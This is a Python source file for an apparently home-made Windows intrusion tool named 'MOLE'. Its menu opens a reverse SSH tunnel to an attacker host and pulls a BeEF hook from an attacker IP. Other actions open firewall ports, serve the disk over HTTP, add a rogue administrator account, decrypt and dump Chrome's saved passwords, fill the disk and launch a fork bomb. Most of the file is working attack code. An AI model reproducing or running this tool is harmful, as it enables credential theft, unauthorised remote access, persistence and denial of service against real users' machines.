import base64
import os
def cls():
    os.system("cls")

from colorama import init, Fore, Back, Style
init(autoreset=True)

import hashlib
import getpass
import webbrowser
import re
import socket
import sys
from time import sleep
import platform
import subprocess
import logging
import sqlite3
import shutil
from datetime import datetime, timedelta
import json
import win32crypt # type: ignore

logging.basicConfig(
    filename="logger.log",     # log file name
    level=logging.INFO,             # log level (INFO, DEBUG, ERROR)
    format="%(asctime)s - %(levelname)s - %(message)s"
)

CONFIG_FILE = "config.json"

def hash_pw(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

def get_password_hash():
    if not os.path.exists(CONFIG_FILE):
        # First run: ask user to set password
        pw = getpass.getpass("Set a new password: ")
        with open(CONFIG_FILE, "w") as f:
            json.dump({"password_hash": hash_pw(pw)}, f)
        print("Password saved.")
    else:
        with open(CONFIG_FILE) as f:
            return json.load(f)["password_hash"]

stored_hash = get_password_hash()

cls()

while True:
    pw = getpass.getpass("Enter password: ")
    if hash_pw(pw) == stored_hash:
        print("Access granted.")
        break
    else:
        print("Incorrect password.")


logging.info(f"Program started")



#trying to find powershell path
def find_powershell():
    # Try PowerShell Core first
    pwsh_path = r"C:\Program Files\PowerShell\7\pwsh.exe"
    if os.path.exists(pwsh_path):
        return pwsh_path

    # Fallback to Windows PowerShell
    ps_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    if os.path.exists(ps_path):
        return ps_path

    raise FileNotFoundError("No PowerShell executable found")

#defining "run_ps" command to bypass subprocess.run error and PowerShell path not being able to be located
def run_ps(command):
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    env = os.environ.copy()
    env["PATH"] += r";C:\Windows\System32\OpenSSH"
    # No capture_output, no check=True
    proc = subprocess.Popen(
        [ps, "-NoProfile", "-Command", command],
        env=env
    )
    proc.wait()

#adding PowerShell path to a pernament PATH
permapath = r'[Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";C:\Windows\System32\OpenSSH", [System.EnvironmentVariableTarget]::Machine)'
run_ps(permapath)

#define powershell path
pspath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

print(Fore.YELLOW + "!!!THIS PROGRAM IS NEEDED TO "+ Fore.RED + "RUN VIA CMD WITH ADMIN PRIVILEGES " + Fore.YELLOW + "TO RUN PROPERLY!!!")
sleep(4)

#scanverify = if you dont understand go to action 0, it verifies if the scan was initiated first
scanverify = "no"
#ask for password to start the program else exit

logging.info(f"Program accessed with correct password")

cls()
ascii_art = """
 __  __  ___  _     _____
|  \/  |/ _ \| |   | ____|
| |\/| | | | | |   |  _|
| |  | | |_| | |___| |___
|_|  |_|\___/|_____|_____|
"""

print(Fore.RED + ascii_art)
sleep(2)
print(" ")

#ask to scan the machine whilst if "y" then gather system information else if "n" ask to continue else exit
print("Welcome, ")
while True:
    print("Choose your action: ")
    print("result) Print current machine scan outcome (only usable after action 1)") 
    sleep(0.1) 
    print("")
    sleep(0.1)
    print("scan) Scan this machine")
    sleep(0.1)
    print("hook) Attempt to hook this machine via BeEF")
    sleep(0.1)
    print("ssh) Attempt a local SSH connection")
    sleep(0.1)
    print("ftp) Attempt a FTP connection")
    sleep(0.1)
    print("ping) Check IP connectivity and response")
    sleep(0.1)
    print("DiskFill) Run diskfiller to fill up disk space")
    sleep(0.1)
    print("DiskHost) Localy host a disk of the target machine")
    sleep(0.1)
    print("AddAdmin) Generate a new admin account on target machine")
    sleep(0.1)
    print("PassExport) Export browser saved passwords (Chrome only)")
    sleep(0.1)
    print("ForkBomb) Attempt a forkbomb on current machine")
    sleep(0.1)
    print(" ")
    sleep(0.1)
    print("exit) To exit the program")
    sleep(0.1)
    print("info) Shows details of a chosen command")
    print(" ")
    sleep(0.1)
    print("help) Show available actions")
    sleep(0.1)
    action = input("M0L€> ")
    cls()

    
#
#
#
#
#
#
#
#
#
#
#
#
#
#


#Action help = showing available actions
    if action == "help":
        logging.info(f"Chosen action help to show available actions")
        print(Fore.YELLOW + "Choose action manual: ")
        print(" ")
        sleep(0.1)
        print("result) Print current machine scan outcome (only usable after action 1)") 
        sleep(0.1)
        print("scan) Scans this machine: OS, network name, machine type, platform info, local IP address")
        sleep(0.1)
        print("hook) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine")
        sleep(0.1)
        print("ssh) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine")
        sleep(0.1)
        print("ftp) Attempt a FTP connection: requires FTP server running on attacker machine")
        sleep(0.1)
        print("ping) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time")
        sleep(0.1)
        print("DiskFill) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine")
        sleep(0.1)
        print("DiskHost) Localy host a disk of the target machine: hosts current folder via python http server on port 8100")
        sleep(0.1)
        print("AddAdmin) Generate a new admin account on target machine")
        sleep(0.1)
        print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser")
        sleep(0.1)
        print("ForkBomb) Attemps a forkbomb on current machine potetionally leaving without any logging")
        sleep(0.1)
        print("info) used as a help command, combine info with a Mole command to see its details")
        sleep(0.1)
        print("exit) To exit the program")
        input("Press Enter to continue...")

#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action result = Printing the outcome of the scan
    if action == "result":
        logging.info(f"Chosen action result to print system information")
        if scanverify == "yes":
           info()
           logging.info(f"System info printed out")
           input("Press Enter to continue...")
           cls()
        else:
            cls()
            print("Scan was not initiated (action 1), run scan first")
            logging.error(f"Scan not initiated, action 0 cannot proceed")
            sleep(4)
    else:
        print("")
        
#
#
#
#
#
#
#
#
#
#
#
#
#
#

#action 1 = scanning the machine
    if action == "scan":
        logging.info(f"Chosen action 1 to scan the machine")
        scanverify = "yes"
        cls()
        sleep(1)
        print("System Information:")
        sleep(0.1)
        system=platform.system()
        print(Fore.RED + platform.system())
        sleep(0.1)
        node=platform.node()
        print(platform.node())
        sleep(0.1)
        machine=platform.machine()
        print(platform.machine())
        sleep(0.1)
        platform_info=platform.platform()
        print(Fore.RED + platform.platform())
        sleep(0.1)
        
        # GET IP PROPERLY - store it in GLOBAL variable
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        real_ip = s.getsockname()[0]
        print(Fore.RED + real_ip)
        s.close()
        
        # Store for later use
        global stored_system_info
        stored_system_info = {
            "system": system,
            "node": node,
            "machine": machine,
            "platform_info": platform_info,
            "ip": real_ip
        }
        
        sleep(1)
        input("Press Enter to continue...")
        cls()

        def info():
            print(Fore.RED + "System: " + Fore.RED + stored_system_info["system"])
            sleep(0.1)
            print(Fore.RED + "Network name: " + Fore.RED + stored_system_info["node"])
            sleep(0.1)
            print(Fore.RED + "Machine type: " + Fore.RED + stored_system_info["machine"])
            sleep(0.1) 
            print(Fore.RED + "Platform info: " + Fore.RED + stored_system_info["platform_info"])
            sleep(0.1)
            print(Fore.RED + "Local IP address: " + Fore.RED + stored_system_info["ip"])
            sleep(0.1)

        scan_data = {
            "System": system,
            "Network Name": node,
            "Machine Type": machine,
            "Platform Info": platform_info,
            "IP": real_ip,
        }

        # storing scan data into a json file
        with open("scan_results.json", "w") as f: 
            json.dump(scan_data, f, indent=4)

#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action hook = beef hook
    if action == "hook":
        logging.info(f"Chosen action hook to attempt beef hook")
        pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
        sleep(0.1)
        while True:
            beefip=input("IP that beef is running on (pure IP number with port-native port 3000): ")
            if re.match (pattern, beefip):
                cls()
                print("Valid IP, trying hook...")
                sleep(0.1)
                webbrowser.open("http://" + beefip + "/hook.js")
                logging.info(f"Opened beef hook URL: http://{beefip}/hook.js")
                print("The hook has started...")
                sleep(1)
                break

            else:
                print("Invalid IP input")
                logging.error(f"Invalid IP input for beef hook: {beefip}")
                sleep(0.1)

    else:
        print("")

#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action ssh = local SSH connection
    if action == "ssh":
        logging.info(f"Chosen action ssh to attempt local SSH connection")
        print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell to conenct!!!")
        while True:
            attackerscriptcontinue=input("Continue? y/n: ")
            sleep(0.1)
            if attackerscriptcontinue == "n":
                logging.error("User chose not to continue with SSH connection attempt")
                print("Will not continue...")
                sleep(0.1)
            elif attackerscriptcontinue == "y":
                logging.info("User chose to continue with SSH connection attempt")
                skip=input("Skip openSSH install and config? (for first program startup not recommended)  y/n: ")
                if skip == "n":
                    logging.info(f"Proceeding with openSSH installation and configuration")
                    #installing OpenSSH Client and Server via PowerShell commands
                    #link for the openSSH installation: https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell&pivots=windows-10
                    installsshd="Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
                    run_ps(installsshd)
    
                    installsshdserver="Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
                    run_ps(installsshdserver)
                    sleep(2)
                    startservice="Start-Service sshd"
                    run_ps(startservice)
                    sleep(2)
                    startupsshd="Set-Service -Name sshd -StartupType 'Automatic'"
                    run_ps(startupsshd)
                    sleep(2)
                    addtopath = '$env:PATH += ";C:\\Windows\\System32\\OpenSSH"'
                    run_ps(addtopath)

                    #allowing p22 and p9000 in firewall
                    fwr22 = 'New-NetFirewallRule -DisplayName "Allow SSH 22" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow'
                    run_ps(fwr22)
                    logging.info("Allowed SSH port 22 in firewall")
                    fwr9000 = 'New-NetFirewallRule -DisplayName "Allow SSH Tunnel 9000" -Direction Inbound -Protocol TCP -LocalPort 9000 -Action Allow'
                    run_ps(fwr9000)
                    logging.info("Allowed SSH Tunnel port 9000 in firewall")
                    sleep(2)

                    #stating the PS comand to persistent SSH tunnel
                    attackeruser=input("Enter attacker SSH username: ")
                    sleep(0.1)
                    attackerip=input("Enter attacker IP (without port): ")
                    sleep(0.1)
                    correctsshinput=input("You put " + attackeruser + " as the attacker user, and " + attackerip + " as attacker IP, correct? y/n: ")
                    sleep(0.1)
                else:
                    logging.warning(f"Skipping openSSH installation and configuration")        
                    #stating the PS comand to persistent SSH tunnel
                    attackeruser=input("Enter attacker SSH username: ")
                    sleep(0.1)
                    attackerip=input("Enter attacker IP (without port): ")
                    sleep(0.1)
                    correctsshinput=input("You put " + attackeruser + " as the attacker user, and " + attackerip + " as attacker IP, correct? y/n: ")
                    sleep(0.1)
                
                if correctsshinput == "y":
                    logging.info(f"User confirmed SSH input details")
                    print(Fore.YELLOW + "Attempting to connect to attacker on " + attackerip)
                    sleep(1)
                    print(Fore.YELLOW + "In the meanwhile run listener_attacker.sh on your attacker machine!")
                    sleep(2)
                    ssh_tunnel="ssh -R 9000:localhost:22 "+attackeruser+"@"+attackerip
                    run_ps(ssh_tunnel)
                    sleep(10)
                    cls()
                    break
                else:
                    logging.error(f"User did not confirm SSH input details, action aborted")
                    print(" ")
                    sleep(0.1)
            else:
                print(" ")
                sleep(0.1)
                break
            
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#Action ftp = FTP connection
    if action == "ftp":
        logging.info(f"Chosen action ftp to attempt FTP connection")
        fwr21 = 'New-NetFirewallRule -DisplayName "Allow FTP 21" -Direction Inbound -Protocol TCP -LocalPort 21 -Action Allow'
        run_ps(fwr21)
        ftpuser=input("Enter attacker user: ")
        ftpIP=input("Enter attacker IP: ")
        ftpconnect=r".\ftp "+ftpuser+"@"+ftpIP
        run_ps(ftpconnect)

#
#
#
#
#
#
#
#
#
#
#
#
#
#
#Action ping = pinging target IP
    if action == "ping":
        logging.info(f"Chosen action ping to check IP connectivity and response")
        targetip=input("Enter target IP to ping: ")
        subprocess.run(["ping", targetip])
        logging.info(f"Pinging the target machine")
        
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#Action DiskFiller = filling up disk space
    if action == "DiskFill":
        logging.info(f"Chose action DiskFill to fill a target computer disk")
        usermovefile=input("Did you move the installed files from each other? (meaning this program being somewhere different than the other files included in this repo? y/n: ")
        if usermovefile == "y":
            pathtodiskfiller=input("Enter path to diskfiller.bat (example d:\\filler\\diskfiller.bat), will be in the same folder as this program: ")
            subprocess.run(pathtodiskfiller, shell=True)
        else:
            subprocess.run("diskfiller.bat", shell=True)

        logging.info(f"Started the diskfiller.bat")
    
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#Action DiskHoster = hosting target disk on local network
    if action == "DiskHost":
        logging.info(f"Chosen action DiskHost to host target disk onto a local network")
        hostdisk="python -m http.server 8100 --bind 0.0.0.0"
        run_ps(hostdisk)

        sleep(1)
        print("Started a local folder share on port 8100")
        logging.info("Started a local folder share on port 8100")
        sleep(0.5)
        print("Go to http//:<targetip>:8100   to browse the files")

#
#
#
#
#
#
#
#
#
#
#
#
#
#
#Action AddAdmin = creating new admin account on target machine
    if action =="AddAdmin":
        logging.info(f"Chosen action AddAdmin to generate a new admin account on target machine")
        newadminuser=input("Enter new admin username: ")
        sleep(0.1)
        newadminpass=input("Enter new admin password: ")
        sleep(0.1)
        createuser="net user " + newadminuser + " " + newadminpass + " /add"
        run_ps(createuser)
        sleep(1)
        addtoadmin="net localgroup Administrators " + newadminuser + " /add"
        run_ps(addtoadmin)
        print(Fore.GREEN + "New admin user created: " + newadminuser)
        logging.info(f"New admin user created: {newadminuser}")

#
#
#
#
#
#
#
#
#
#
#
#
#
#
#Action PassExport = retrieving Chrome saved passwords
    if action == "PassExport":
        logging.info(f"Chosen action PassExport to retrieve Chrome browsing history")
        
        # Check if we're on Windows
        if platform.system() != "Windows":
            print(Fore.RED + "[!] This feature requires Windows!")
            input("Press Enter to continue...")
            cls()
            continue
        
        try:
            import win32crypt  # type: ignore
            from Crypto.Cipher import AES
        except ImportError:
            print(Fore.RED + "[!] Install packages:")
            print(Fore.YELLOW + "pip install pywin32 pycryptodome")
            input("Press Enter to continue...")
            cls()
            continue
        
        def get_master_key():
            """Get Chrome's master encryption key using DPAPI"""
            local_state_path = os.path.join(
                os.environ["USERPROFILE"], 
                "AppData", "Local", "Google", "Chrome", 
                "User Data", "Local State"
            )
            
            try:
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                
                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
                
                master_key = win32crypt.CryptUnprotectData(
                    encrypted_key, None, None, None, 0
                )[1]
                
                return master_key
                
            except Exception as e:
                print(Fore.RED + f"[!] Failed to get master key: {e}")
                return None
        
        def try_decrypt_password(encrypted_password, master_key):
            """Try to decrypt, return both encrypted and decrypted data"""
            if not encrypted_password:
                return {
                    "decrypted": "",
                    "encrypted_hex": "",
                    "encrypted_b64": "",
                    "status": "empty",
                    "length": 0
                }
            
            # Store encrypted data in multiple formats
            encrypted_hex = encrypted_password.hex()
            encrypted_b64 = base64.b64encode(encrypted_password).decode('utf-8')
            
            # Try decryption methods
            decrypted_text = ""
            status = "encrypted_only"
            format_info = "unknown"
            
            try:
                # Method 1: Chrome v80+ AES-GCM
                if encrypted_password[:3] in [b'v10', b'v11']:
                    format_info = encrypted_password[:3].decode('ascii', errors='ignore')
                    nonce = encrypted_password[3:15]
                    ciphertext_with_tag = encrypted_password[15:]
                    
                    if len(ciphertext_with_tag) >= 16:
                        tag = ciphertext_with_tag[-16:]
                        ciphertext = ciphertext_with_tag[:-16]
                        
                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                        decrypted_text = decrypted.decode('utf-8')
                        status = "decrypted_aes_gcm"
                    else:
                        status = "aes_gcm_incomplete"
                        
                # Method 2: DPAPI encrypted
                elif encrypted_password[:4] == b'\x01\x00\x00\x00':
                    format_info = "dpapi"
                    decrypted = win32crypt.CryptUnprotectData(
                        encrypted_password, None, None, None, 0
                    )[1]
                    if decrypted:
                        decrypted_text = decrypted.decode('utf-8')
                        status = "decrypted_dpapi"
                    else:
                        status = "dpapi_failed"
                
                # Method 3: Unknown format but try DPAPI anyway
                else:
                    format_info = f"unknown_{encrypted_password[:4].hex()}"
                    try:
                        decrypted = win32crypt.CryptUnprotectData(
                            encrypted_password, None, None, None, 0
                        )[1]
                        if decrypted:
                            decrypted_text = decrypted.decode('utf-8')
                            status = "decrypted_unknown"
                        else:
                            status = "unknown_format"
                    except:
                        status = "unknown_format"
                        
            except Exception as e:
                status = f"error_{str(e)[:30]}"
            
            return {
                "decrypted": decrypted_text,
                "encrypted_hex": encrypted_hex[:100] + "..." if len(encrypted_hex) > 100 else encrypted_hex,
                "encrypted_b64": encrypted_b64[:80] + "..." if len(encrypted_b64) > 80 else encrypted_b64,
                "status": status,
                "format": format_info,
                "length": len(encrypted_password)
            }
        
        try:
            print(Fore.YELLOW + "[*] Getting Chrome master encryption key...")
            master_key = get_master_key()
            
            if not master_key:
                print(Fore.RED + "[!] Could not get master key. Try:")
                print(Fore.YELLOW + "    1. Run as Administrator")
                print(Fore.YELLOW + "    2. Make sure Chrome is closed")
                input("Press Enter to continue...")
                cls()
                continue
            
            print(Fore.GREEN + f"[+] Got master key: {master_key[:16].hex()}...")
            
            # Path to Chrome passwords
            chrome_db_path = os.path.join(
                os.environ["USERPROFILE"], 
                "AppData", "Local", "Google", "Chrome", 
                "User Data", "Default", "Login Data"
            )
            
            if not os.path.exists(chrome_db_path):
                print(Fore.RED + "[!] Chrome password database not found")
                input("Press Enter to continue...")
                cls()
                continue
            
            # Copy database
            temp_db = "temp_chrome_passwords.db"
            shutil.copy2(chrome_db_path, temp_db)
            
            # Query database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            passwords = cursor.fetchall()
            
            if not passwords:
                print(Fore.YELLOW + "[!] No saved passwords found")
                conn.close()
                os.remove(temp_db)
                input("Press Enter to continue...")
                cls()
                continue
            
            print(Fore.GREEN + f"[+] Found {len(passwords)} saved passwords")
            
            # Process passwords
            all_results = []
            decrypted_count = 0
            
            for i, (url, username, encrypted_password) in enumerate(passwords[:25], 1):  # First 25
                result = try_decrypt_password(encrypted_password, master_key)
                
                entry = {
                    "url": url,
                    "username": username,
                    **result  # Unpack all the decrypt result fields
                }
                all_results.append(entry)
                
                if result["decrypted"]:
                    decrypted_count += 1
                
                # Show first 10 entries
                if i <= 10:
                    print(Fore.CYAN + f"\n[{i}] {url[:40]}...")
                    print(Fore.WHITE + f"    User: {username}")
                    
                    if result["decrypted"]:
                        print(Fore.GREEN + f"    Pass: {result['decrypted'][:30]}...")
                        print(Fore.YELLOW + f"    Status: {result['status']}")
                    else:
                        print(Fore.RED + f"    [ENCRYPTED]")
                        print(Fore.YELLOW + f"    Format: {result['format']}")
                        print(Fore.YELLOW + f"    Hex: {result['encrypted_hex'][:30]}...")
                        print(Fore.YELLOW + f"    B64: {result['encrypted_b64'][:30]}...")
            
            # Save to JSON
            if all_results:
                filename = f"chrome_passwords.json"
                
                output_data = {
                    "metadata": {
                        "extraction_date": datetime.now().isoformat(),
                        "machine": platform.node(),
                        "os": platform.platform(),
                        "total_passwords": len(passwords),
                        "decrypted_success": decrypted_count,
                        "master_key_preview": master_key[:16].hex(),
                        "master_key_length": len(master_key)
                    },
                    "passwords": all_results
                }
                
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(output_data, f, indent=4, ensure_ascii=False)
                
                print(Fore.GREEN + f"\n[+] Saved ALL data to {filename}")
                print(Fore.YELLOW + f"[+] Successfully decrypted: {decrypted_count}/{len(passwords)}")
                print(Fore.CYAN + f"[+] JSON contains BOTH encrypted and decrypted data")
            
            conn.close()
            os.remove(temp_db)
            
        except Exception as e:
            print(Fore.RED + f"[!] Error: {e}")
            import traceback
            traceback.print_exc()
        
        input(Fore.YELLOW + "\nPress Enter to continue...")
        cls()

    else:
        print("")
        sleep(0.1)

#
#
#
#
#
#
#
#
#
#


if action == "ForkBomb":
    logging.info(f"Chosen to attempt a forkbomb")
    # Create the fork bomb batch file
    run_ps('New-Item -Path "Friend.bat" -ItemType File -Force')
    run_ps('Set-Content -Path "Friend.bat" -Value "@echo off"')
    run_ps('Add-Content -Path "Friend.bat" -Value ":A"')
    run_ps('Add-Content -Path "Friend.bat" -Value "start %0"')
    run_ps('Add-Content -Path "Friend.bat" -Value "goto A"')
    
    # Execute it
    run_ps('Start-Process -FilePath "Friend.bat" -WindowStyle Hidden')
        
        


#
#
#
#
#
#
#
#
#
#

    
    
#Action exit = exiting the program
    if action == "exit":
        logging.info(f"Chosen action PassExport to exit the program")
        print("Exiting the program...")
        sleep(3)

        exit()
